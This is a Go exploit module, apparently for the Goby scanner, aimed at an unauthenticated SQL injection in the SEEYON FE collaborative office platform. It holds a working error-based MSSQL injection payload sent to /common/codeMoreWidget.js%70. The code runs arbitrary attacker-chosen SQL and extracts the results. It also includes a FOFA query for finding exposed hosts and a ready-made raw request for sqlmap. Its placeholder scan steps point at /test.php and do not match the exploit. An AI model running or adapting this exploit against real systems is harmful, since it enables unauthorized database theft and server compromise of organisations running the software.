package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SEEYON-FE /codeMoreWidget.js%70 SQL Injection Vulnerability",
    "Description": "<p>Zhiyuan Internet FE collaborative office platform is a product that provides enterprises with a full range of collaborative office solutions. It integrates multiple functional modules designed to help enterprises achieve efficient team collaboration, information sharing, and document management. </p><p>There is an SQL injection vulnerability at the interface of /codeMoreWidget.js%70 of Zhiyuan Internet FE collaborative office platform, through which an unauthenticated attacker can obtain sensitive database information and gain server privileges through in-depth exploitation.</p>",
    "Product": "SEEYON-FE",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2024-06-17",
    "PostTime": "2024-10-28",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"li_plugins_download\" && body=\"openDownloadWin()\"",
    "GobyQuery": "body=\"li_plugins_download\" && body=\"openDownloadWin()\"",
    "Level": "1",
    "Impact": "<p>There is an SQL injection vulnerability at the interface of /codeMoreWidget.js%70 of Zhiyuan Internet FE collaborative office platform, through which an unauthenticated attacker can obtain sensitive database information and gain server privileges through in-depth exploitation.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/140059992"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT @@VERSION",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "致远互联FE协作办公平台 /codeMoreWidget.js%70 SQL 注入漏洞",
            "Product": "致远互联-FE",
            "Description": "<p>致远互联FE协作办公平台是一款为企业提供全方位协同办公解决方案的产品。它集成了多个功能模块，旨在帮助企业实现高效的团队协作、信息共享和文档管理。<br></p><p>致远互联FE协作办公平台 /codeMoreWidget.js%70接口处存在SQL注入漏洞,未经身份验证的攻击者可以通过此漏洞获取数据库敏感信息，深入利用可获取服务器权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>致远互联FE协作办公平台 /codeMoreWidget.js%70接口处存在SQL注入漏洞,未经身份验证的攻击者可以通过此漏洞获取数据库敏感信息，深入利用可获取服务器权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "SEEYON-FE /codeMoreWidget.js%70 SQL Injection Vulnerability",
            "Product": "SEEYON-FE",
            "Description": "<p>Zhiyuan Internet FE collaborative office platform is a product that provides enterprises with a full range of collaborative office solutions. It integrates multiple functional modules designed to help enterprises achieve efficient team collaboration, information sharing, and document management.&nbsp;</p><p>There is an SQL injection vulnerability at the interface of /codeMoreWidget.js%70 of Zhiyuan Internet FE collaborative office platform, through which an unauthenticated attacker can obtain sensitive database information and gain server privileges through in-depth exploitation.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability at the interface of /codeMoreWidget.js%70 of Zhiyuan Internet FE collaborative office platform, through which an unauthenticated attacker can obtain sensitive database information and gain server privileges through in-depth exploitation.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`

setSqlPayloadHashSCUJIAHYUIFYUASGHTUFGDYFGASUTKYGFDHASYDFYUGETAFRTQWFCGYSDA := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = `1' AND 9322 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(113)+(`+sql+`)+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(122)+CHAR(113)))--`
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewPostRequestConfig(sqlUrl)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
      postRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
      postRequest.Data = "code="+sql
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/common/codeMoreWidget.js%70"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil{
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/common/codeMoreWidget.js%70"

		return resp, vulurl, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "tblgqlvq"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `SELECT (CHAR(116)+CHAR(98)+CHAR(108)+CHAR(103)+CHAR(113)+CHAR(108)+CHAR(118)+CHAR(113))`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qbkqq((.|\n)*?)qkxzq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashSCUJIAHYUIFYUASGHTUFGDYFGASUTKYGFDHASYDFYUGETAFRTQWFCGYSDA
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /common/codeMoreWidget.js%70 HTTP/1.1
Host: `+expResult.HostInfo.HostInfo+`
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
 
code=%31%27%20%41%4e%44%20%39%33%32%32%20%49%4e%20%28%53%45%4c%45%43%54%20%28%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%39%38%29%2b%43%48%41%52%28%31%30%37%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%31%33%29%2b%28%73%65%6c%65%63%74%20%27%31%32%27%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%30%37%29%2b%43%48%41%52%28%31%32%30%29%2b%43%48%41%52%28%31%32%32%29%2b%43%48%41%52%28%31%31%33%29%29%29%2d%2d`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qbkqq((.|\n)*?)qkxzq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashSCUJIAHYUIFYUASGHTUFGDYFGASUTKYGFDHASYDFYUGETAFRTQWFCGYSDA
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "select DB_NAME()"
					} else if way == "db_version" {
						sql = "select @@VERSION"
					} else if way == "user_name" {
						sql = "select SYSTEM_USER"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
